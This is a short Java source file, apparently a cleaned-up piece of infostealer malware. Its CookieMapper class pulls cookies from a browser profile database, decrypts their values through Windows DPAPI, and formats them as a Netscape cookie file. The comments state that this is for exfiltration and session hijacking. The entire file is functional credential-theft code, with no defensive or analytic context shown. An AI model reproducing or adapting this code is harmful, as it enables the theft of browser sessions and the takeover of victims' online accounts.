import java.sql.ResultSet;

/**
 * Cleaned CookieMapper (formerly ç.java)
 * Extracts browser cookies, decrypts their values using DPAPI,
 * and formats them into the standard Netscape cookie format for exfiltration.
 */
public class CookieMapper implements DataMapper {
    private final BrowserStats stats;
    private final DPAPIDecryptor decryptor;
    private final String browserProfile;

    public CookieMapper(BrowserStats stats, DPAPIDecryptor decryptor, String profile) {
        this.stats = stats;
        this.decryptor = decryptor;
        this.browserProfile = profile;
    }

    @Override
    public String mapRow(ResultSet rs) throws Exception {
        this.stats.totalCookiesFound++;

        String host = rs.getString("host_key");
        String path = rs.getString("path");
        String name = rs.getString("name");
        long expiry = rs.getLong("expires_utc");
        boolean isSecure = rs.getInt("is_secure") == 1;
        
        // Decrypt the cookie value
        byte[] encryptedValue = rs.getBytes("encrypted_value");
        String decryptedValue = decryptor.decrypt(encryptedValue);

        if (decryptedValue == null || decryptedValue.isEmpty()) {
            return "";
        }

        this.stats.totalCookiesDecrypted++;

        // Format as Netscape Cookie File (standard for session hijacking tools)
        // Format: host [tab] isSecure [tab] path [tab] secureOnly [tab] expiry [tab] name [tab] value
        String secureFlag = isSecure ? "TRUE" : "FALSE";
        String isDomainOnly = host.startsWith(".") ? "TRUE" : "FALSE";

        return String.format("%s\t%s\t%s\t%s\t%d\t%s\t%s\n", 
            host, isDomainOnly, path, secureFlag, expiry, name, decryptedValue);
    }
}
